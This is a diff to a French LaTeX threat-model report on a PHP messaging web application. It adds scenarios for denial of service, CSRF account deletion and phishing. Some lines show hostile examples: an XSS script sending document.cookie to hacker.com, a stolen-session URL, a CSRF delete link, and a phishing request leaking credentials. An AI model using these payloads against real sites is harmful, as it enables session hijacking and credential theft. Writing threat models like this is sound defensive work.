@@ -299,7 +299,7 @@ $query->execute();
 <script>document.location="http://hacker.com/cookiestealer.php?cookie="document.cookie;</script>
 \end{lstlisting} 
 Dès que l'administrateur ouvre le message, il va directement faire une requête sur le site de l'attaquant avec sa session:
-        \begin{lstlisting}
+        \begin{lstlisting}[language=html]
 http://hacker.com/cookiestealer.php?cookie=PHPSESSID=riqbmmcaclh148j631uinq8375
 \end{lstlisting} 
 L'attaquant peut récupérer l'id de session et le remplacer avec sa session actuelle. Ainsi, il pourra s'authentifier sur le compte administrateur.
@@ -308,25 +308,53 @@ L'attaquant peut récupérer l'id de session et le remplacer avec sa session act
     \subsection*{Scénario de menace 6: Denial Of Service (DOS)}
         \paragraph{Impact sur l'entreprise} Moyen à haut (indisponibilité du service de messagerie)
         \paragraph{Source de menace} Hackers, Concurrent, Employé (avec des compétences avancées)
-        \paragraph{Motivation}
+        \paragraph{Motivation} Cela pourrait être pour une vengeance personnelle ou simplement afin d'empêcher l'utilisation du système en le rendant indisponible.
         \paragraph{Actif ciblé} Système entier
-        \paragraph{Scénario d'attaque}
+        \paragraph{Scénario d'attaque} On peut utiliser à nouveau une injection HTML/Javascript dans un message afin d'envoyer en boucle infinie de requêtes au serveur à tous les utilisateurs du système. Ainsi, lorsqu'un utilisateur ouvre le message, le script est exécuté et le serveur surchargé.
         \paragraph{Contre-mesures}
-    \subsection*{Scénario de menace 7: Suppression des utilisateurs (XSS)}
+    \subsection*{Scénario de menace 7: Suppression d'un utilisateur (CSRF)}
         \paragraph{Impact sur l'entreprise} Moyen
-        \paragraph{Source de menace} Hacker, Concurrent, Employé (avec des compétences avancées)
-        \paragraph{Motivation}
+        \paragraph{Source de menace} Hacker, Concurrent
+        \paragraph{Motivation} Pour un hacker cela peut être un challenge personnel ou un amusement. Pour un concurrent, cela lui permettrait d'avoir un certain accès au système.
         \paragraph{Actif ciblé} Utilisateurs
+        \paragraph{Scénario d'attaque} La première étape de l'attaque est de pouvoir visualiser les différentes pages (fichiers php) qui se trouvent sur l'application web. Il existe plusieurs manières de la faire. On peut soit utiliser des outils de \textit{bruteforce} d'URLs tels que \verb|ZAP|, proposé par OWASP qui inclut \verb|dirsearch|, ou \verb|gobuster|. \\ 
+        
+        Sinon, il est également possible d'accéder à la liste des différentes ressources en testant directement d'ajouter des répertoires dans l'URL comme par exemple: \\
+        
+        \verb|http://localhost:8080/includes| \\
+        \verb|http://localhost:8080/views| \\
+        
+        Les deux exemples ci-dessus sont des répertoires fréquemment utilisés dans des applications web. \\
+        
+        La seconde étape est de se focaliser sur une ressource que l'on souhaite utiliser pour effectuer notre attaque. Dans ce scénario, nous cherchons à supprimer un compte utilisateur. Ainsi, nous pouvons chercher \verb|deleteUser.php| ou \verb|delete_user.php|. \\
+        
+        À présent, nous constatons que la ressource prend en paramètres l'id d'un utilisateur à supprimer. Afin de trouver l'id correspondant, on peut regarder le code source la page où se trouvent tous les messages reçus et on pourra trouver l'id utilisé pour effectuer les requêtes. Dans notre cas, l'id est le nom de l'utilisateur. \\
+        
+        Finalement, nous pouvons préparer notre requête forgée:
+                \begin{lstlisting}[language=html]
+http://localhost:8080/delete_user?id=user4
+\end{lstlisting} 
+
+Et nous envoyons à la victime un message avec la requête ci-dessus afin de l'inciter à cliquer sur le lien et à supprimer l'utilisateur en paramètres.
+        
+        \paragraph{Contre-mesures}
+    \subsection*{Scénario de menace 8: Phishing}
+        \paragraph{Impact sur l'entreprise} Moyen
+        \paragraph{Source de menace} Hacker, Cybercrime, Concurrent
+        \paragraph{Motivation} La motivation principal serait d'avoir accès au système.
+        \paragraph{Actif ciblé} Utilisateurs (credentials)
+        \paragraph{Scénario d'attaque} On peut directement injecter du code dans un message envoyé à plusieurs victimes qui permettra d'afficher une fenêtre avec un formulaire à l'intérieur. Le formulaire demande aux utilisateurs d'entrer leurs informations personnelles tels que leurs identifiants (username + mot de passe). Une fois le formulaire validé, les informations sont envoyées à une URL de l'attaquant. La requête se présente ainsi:
+                        \begin{lstlisting}[language=html]
+http://hacker.com/phishing.php?name=user3&password=12345
+\end{lstlisting} 
+        \paragraph{Contre-mesures}
+    \subsection*{Scénario de menace 9: Accès aux ressources}
+        \paragraph{Impact sur l'entreprise} Haut
+        \paragraph{Source de menace} Hacker, Concurrent, Employé
+        \paragraph{Motivation} La motivation principal serait d'avoir accès au système. Pour les employés, ce serait d'avoir accès aux fonctionnalités d'un administrateur.
+        \paragraph{Actif ciblé} Système en entier
         \paragraph{Scénario d'attaque}
         \paragraph{Contre-mesures}
-    \subsection*{Scénario de menace 8: Modification d’un rôle d’un utilisateur (CSRF)}
-        \paragraph{Impact sur l'entreprise} 
-        \paragraph{Source de menace} Hacker, Concurrent, Employé (avec des compétences avancées)
-        \paragraph{Motivation}
-        \paragraph{Actif ciblé}
-        \paragraph{Scénario d'attaque}
-        \paragraph{Contre-mesures}
-    \subsection*{Scénario de menace 9: Phishing}
     \subsection*{STRIDE}
         
     \section*{Contre-mesures}    
